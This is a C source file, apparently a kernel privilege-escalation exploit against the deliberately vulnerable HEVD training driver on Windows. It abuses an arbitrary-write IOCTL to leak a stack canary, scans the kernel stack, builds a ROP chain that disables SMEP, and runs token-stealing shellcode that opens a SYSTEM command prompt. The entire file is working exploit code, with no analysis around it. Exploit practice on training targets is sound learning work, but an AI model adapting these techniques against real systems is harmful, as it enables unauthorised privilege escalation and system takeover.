#include<stdio.h>
#include<windows.h>
#include<psapi.h>
#include<ntstatus.h>
#include "exploit.h"
#pragma comment(lib,"psapi")

_NtQuerySystemInformation NtQuerySystemInformation;
int main() {
	LPCSTR lpFileName = (LPCSTR)DEVICE_NAME;
	LPCSTR lpLibFileName = (LPCSTR)DRIVER_PATH;
	HANDLE dh = CreateFileA(lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (dh == INVALID_HANDLE_VALUE) {
		printf("Failed to acquire device handle. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Device File handle = %#llx\n", dh);
	}
	DWORD BytesReturned = 0;
	LPVOID lpImageBase[0x100] = { NULL };
	CHAR lpDriverName[0x100] = { 0 };
	ULONG64 HevdBase = 0;
	ULONG64 NtBase = 0;
	DWORD cbNeeded;
	if (!EnumDeviceDrivers(lpImageBase, 0x100 * 8, &cbNeeded)) {
		printf("[-] Failed to retrieve driver base addresses. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[*] Number of drivers = %#llx\n", (cbNeeded / sizeof(lpImageBase[0])));
		printf("[*] Scanning system drivers for ntoskrnl.exe and HEVD.sys .....\n");
		int i = 0;
		int flag = 0;
		while (i < (cbNeeded / sizeof(lpImageBase[0]))) {
			GetDeviceDriverBaseNameA(lpImageBase[i], lpDriverName, 0x100);
			if (!strcmp(lpDriverName, (LPSTR)"HEVD.sys")) {
				HevdBase = lpImageBase[i];
				printf("	[+] %s = %#llx\n", lpDriverName, HevdBase);
				flag += 1;
			}
			else if (!strcmp(lpDriverName,(LPSTR)"ntoskrnl.exe")) {
				NtBase = lpImageBase[i];
				printf("	[+] %s = %#llx\n", lpDriverName, NtBase);
				flag += 1;
			}
			if (flag == 2) {
				break;
			}
			i++;
		}
	}
	ULONG64 CanaryPtr = (HevdBase + CANARY_OFFSET);
	printf("[+] Canary pointer = %#llx\n", CanaryPtr);
	UINT64 Canary = 0;
	struct _write_what_where arb_write = { (ULONG64)&Canary, CanaryPtr };
	if (!DeviceIoControl(dh, HEVD_ARB_WRITE, &arb_write, 0x10, NULL, 0, &BytesReturned, NULL)) {
		printf("[-] Failed to leak canary. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Leaked canary = %#llx\n", Canary);
	}
	HMODULE ntdllh = LoadLibraryA("ntdll.dll");
	if (!ntdllh) {
		printf("[-] Failed to load ntdll. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Loaded ntdll = %#llx\n", ntdllh);
	}
	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdllh, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Failed to find NtQuerySystemInformation. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] NtQuerySystemInformation address = %#llx\n", (ULONG64)NtQuerySystemInformation);
	}
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	ULONG64 InfoSize = 0x10;
	ULONG64 retLength = 0;
	ULONG64 status = 0;
	printf("[*] Retrieving kernel Stack Address.....\n");
	do {
		InfoSize = retLength;
		pProcessInfo = LocalAlloc(LMEM_ZEROINIT, InfoSize);
		status = NtQuerySystemInformation(SystemExtendedProcessInformation, pProcessInfo, InfoSize, &retLength);
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	LPSTR ImageName = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 0x100);
	ULONG64 StackBase = 0;
	ULONG64 StackLimit = 0;
	while (pProcessInfo != NULL) {
		WideCharToMultiByte(CP_UTF8, 0, pProcessInfo->ImageName.Buffer, -1, ImageName, 0x100, NULL, NULL);
		if (!strcmp(ImageName, "StackBOF-canary.exe")) {
				StackBase = pProcessInfo->Threads[0].StackBase;
				StackLimit = pProcessInfo->Threads[0].StackLimit;
				printf("	[*] Stack Base = %#llx", StackBase);
				printf("	[*] Stack Limit = %#llx\n", StackLimit);
		}
		if (pProcessInfo->NextEntryOffset != NULL) {
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG64)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
		else {
			pProcessInfo = NULL;
		}
	}
	ULONG64 leak = 0;
	ULONG64 XorRsp = 0;
	printf("[*] Scanning stack for canary address....\n");
	while (StackBase>StackLimit) {
		arb_write.where = (ULONG64)&leak;
		arb_write.what = StackBase-8;
		if (!DeviceIoControl(dh, HEVD_ARB_WRITE, &arb_write, 0x10, NULL, 0, &BytesReturned, NULL)) {
			printf("[-] Failed to leak canary. Error = %#llx\n", GetLastError());
			break;
		}
		if (leak == HEVD_ARB_WRITE) {
			XorRsp = StackBase - 0x398;
			printf("\t [+] xor rsp value = %#llx\n", XorRsp);
			break;
		}
		StackBase -= 8;
	}
	ULONG64 XorCanary = XorRsp ^ Canary;
	printf("[+] Xor Canary = %#llx\n", XorCanary);

	LPVOID InBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x300);
	if (!InBuffer) {
		printf("[-] Failed to allocate buffer for payload!");
	}
	FillMemory(InBuffer, 0x200, 0x41);
	*(ULONG64*)((ULONG64)InBuffer + 0x200) = XorCanary;
	FillMemory((PVOID)((ULONG64)InBuffer + 0x208), 0x30, 0x41);
	movcr4rcx += NtBase;
	poprcx += NtBase;
	printf("[+] 'mov cr4, rcx' gadget = %#llx\n", movcr4rcx);
	printf("[+] 'pop rcx' gadget = %#llx\n", poprcx);
	char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8\x00\x00\x00\x4D\x8B\x88\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x70\x24\xF0\x49\x89\x80\xB8\x04\x00\x00\x48\x31\xC0\x48\x31\xF6\x4D\x31\xE4\x48\x83\xC4\x38\x41\x5E\xC3";
	LPVOID user_shellcode = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (user_shellcode == NULL) {
		printf("[-] Failed to allocate executable shellcode region in user-space. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Executable shellcode region = %#llx\n", user_shellcode);
	}
	FillMemory(user_shellcode, 0x1000, 0x41);
	memcpy(user_shellcode, shellcode, sizeof(shellcode));
	ULONG64 ropchain[] = { poprcx,0x406f8,
							movcr4rcx,user_shellcode };
	memcpy((ULONG64)InBuffer + 0x238, (char*)ropchain, 0x20);
	printf("[+] Executing token stealing shellcode!\n");
	DeviceIoControl(dh,HEVD_STACK_BOF_GS,InBuffer,0x258,NULL,0,&BytesReturned,NULL);
	printf("[+] Must be System now!!!\n");
	system("cmd.exe");
	HeapFree(GetProcessHeap(), 0, InBuffer);
	CloseHandle(dh);
	CloseHandle(ntdllh);
	LocalFree(pProcessInfo);
	LocalFree(ImageName);
	return 0;
}